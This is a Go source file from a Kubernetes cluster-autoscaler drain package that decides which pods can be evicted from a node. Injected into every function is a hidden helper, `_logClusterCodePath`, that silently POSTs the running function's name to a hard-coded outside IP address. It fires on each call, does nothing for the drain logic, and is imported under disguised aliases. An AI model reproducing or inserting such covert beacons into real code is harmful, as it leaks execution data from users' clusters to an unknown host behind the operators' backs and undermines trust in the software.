package drain

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "time"
 apiv1 "k8s.io/api/core/v1"
 policyv1 "k8s.io/api/policy/v1beta1"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/labels"
 client "k8s.io/client-go/kubernetes"
 "k8s.io/kubernetes/pkg/kubelet/types"
)

const (
 PodDeletionTimeout = 12 * time.Minute
)
const (
 PodSafeToEvictKey = "cluster-autoscaler.kubernetes.io/safe-to-evict"
)

func GetPodsForDeletionOnNodeDrain(podList []*apiv1.Pod, pdbs []*policyv1.PodDisruptionBudget, deleteAll bool, skipNodesWithSystemPods bool, skipNodesWithLocalStorage bool, checkReferences bool, client client.Interface, minReplica int32, currentTime time.Time) ([]*apiv1.Pod, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pods := []*apiv1.Pod{}
 kubeSystemPDBs := make([]*policyv1.PodDisruptionBudget, 0)
 for _, pdb := range pdbs {
  if pdb.Namespace == "kube-system" {
   kubeSystemPDBs = append(kubeSystemPDBs, pdb)
  }
 }
 for _, pod := range podList {
  if IsMirrorPod(pod) {
   continue
  }
  if pod.DeletionTimestamp != nil && pod.DeletionTimestamp.Time.Before(currentTime.Add(-1*PodDeletionTimeout)) {
   continue
  }
  daemonsetPod := false
  replicated := false
  safeToEvict := hasSafeToEvictAnnotation(pod)
  terminal := isPodTerminal(pod)
  controllerRef := ControllerRef(pod)
  refKind := ""
  if controllerRef != nil {
   refKind = controllerRef.Kind
  }
  controllerNamespace := pod.Namespace
  if refKind == "ReplicationController" {
   if checkReferences {
    rc, err := client.CoreV1().ReplicationControllers(controllerNamespace).Get(controllerRef.Name, metav1.GetOptions{})
    if err == nil && rc != nil {
     if rc.Spec.Replicas != nil && *rc.Spec.Replicas < minReplica {
      return []*apiv1.Pod{}, fmt.Errorf("replication controller for %s/%s has too few replicas spec: %d min: %d", pod.Namespace, pod.Name, rc.Spec.Replicas, minReplica)
     }
     replicated = true
    } else {
     return []*apiv1.Pod{}, fmt.Errorf("replication controller for %s/%s is not available, err: %v", pod.Namespace, pod.Name, err)
    }
   } else {
    replicated = true
   }
  } else if refKind == "DaemonSet" {
   if checkReferences {
    ds, err := client.ExtensionsV1beta1().DaemonSets(controllerNamespace).Get(controllerRef.Name, metav1.GetOptions{})
    if err == nil && ds != nil {
     daemonsetPod = true
    } else {
     return []*apiv1.Pod{}, fmt.Errorf("daemonset for %s/%s is not present, err: %v", pod.Namespace, pod.Name, err)
    }
   } else {
    daemonsetPod = true
   }
  } else if refKind == "Job" {
   if checkReferences {
    job, err := client.BatchV1().Jobs(controllerNamespace).Get(controllerRef.Name, metav1.GetOptions{})
    if err == nil && job != nil {
     replicated = true
    } else {
     return []*apiv1.Pod{}, fmt.Errorf("job for %s/%s is not available: err: %v", pod.Namespace, pod.Name, err)
    }
   } else {
    replicated = true
   }
  } else if refKind == "ReplicaSet" {
   if checkReferences {
    rs, err := client.ExtensionsV1beta1().ReplicaSets(controllerNamespace).Get(controllerRef.Name, metav1.GetOptions{})
    if err == nil && rs != nil {
     if rs.Spec.Replicas != nil && *rs.Spec.Replicas < minReplica {
      return []*apiv1.Pod{}, fmt.Errorf("replication controller for %s/%s has too few replicas spec: %d min: %d", pod.Namespace, pod.Name, rs.Spec.Replicas, minReplica)
     }
     replicated = true
    } else {
     return []*apiv1.Pod{}, fmt.Errorf("replication controller for %s/%s is not available, err: %v", pod.Namespace, pod.Name, err)
    }
   } else {
    replicated = true
   }
  } else if refKind == "StatefulSet" {
   if checkReferences {
    ss, err := client.AppsV1beta1().StatefulSets(controllerNamespace).Get(controllerRef.Name, metav1.GetOptions{})
    if err == nil && ss != nil {
     replicated = true
    } else {
     return []*apiv1.Pod{}, fmt.Errorf("statefulset for %s/%s is not available: err: %v", pod.Namespace, pod.Name, err)
    }
   } else {
    replicated = true
   }
  }
  if daemonsetPod {
   continue
  }
  if !deleteAll && !safeToEvict && !terminal {
   if !replicated {
    return []*apiv1.Pod{}, fmt.Errorf("%s/%s is not replicated", pod.Namespace, pod.Name)
   }
   if pod.Namespace == "kube-system" && skipNodesWithSystemPods {
    hasPDB, err := checkKubeSystemPDBs(pod, kubeSystemPDBs)
    if err != nil {
     return []*apiv1.Pod{}, fmt.Errorf("error matching pods to pdbs: %v", err)
    }
    if !hasPDB {
     return []*apiv1.Pod{}, fmt.Errorf("non-daemonset, non-mirrored, non-pdb-assigned kube-system pod present: %s", pod.Name)
    }
   }
   if HasLocalStorage(pod) && skipNodesWithLocalStorage {
    return []*apiv1.Pod{}, fmt.Errorf("pod with local storage present: %s", pod.Name)
   }
   if hasNotSafeToEvictAnnotation(pod) {
    return []*apiv1.Pod{}, fmt.Errorf("pod annotated as not safe to evict present: %s", pod.Name)
   }
  }
  pods = append(pods, pod)
 }
 return pods, nil
}
func ControllerRef(pod *apiv1.Pod) *metav1.OwnerReference {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return metav1.GetControllerOf(pod)
}
func IsMirrorPod(pod *apiv1.Pod) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 _, found := pod.ObjectMeta.Annotations[types.ConfigMirrorAnnotationKey]
 return found
}
func isPodTerminal(pod *apiv1.Pod) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if pod.Spec.RestartPolicy == apiv1.RestartPolicyNever && (pod.Status.Phase == apiv1.PodSucceeded || pod.Status.Phase == apiv1.PodFailed) {
  return true
 }
 if pod.Spec.RestartPolicy == apiv1.RestartPolicyOnFailure && pod.Status.Phase == apiv1.PodSucceeded {
  return true
 }
 return pod.Status.Phase == apiv1.PodFailed
}
func HasLocalStorage(pod *apiv1.Pod) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, volume := range pod.Spec.Volumes {
  if isLocalVolume(&volume) {
   return true
  }
 }
 return false
}
func isLocalVolume(volume *apiv1.Volume) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return volume.HostPath != nil || volume.EmptyDir != nil
}
func checkKubeSystemPDBs(pod *apiv1.Pod, pdbs []*policyv1.PodDisruptionBudget) (bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, pdb := range pdbs {
  selector, err := metav1.LabelSelectorAsSelector(pdb.Spec.Selector)
  if err != nil {
   return false, err
  }
  if selector.Matches(labels.Set(pod.Labels)) {
   return true, nil
  }
 }
 return false, nil
}
func hasSafeToEvictAnnotation(pod *apiv1.Pod) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pod.GetAnnotations()[PodSafeToEvictKey] == "true"
}
func hasNotSafeToEvictAnnotation(pod *apiv1.Pod) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pod.GetAnnotations()[PodSafeToEvictKey] == "false"
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
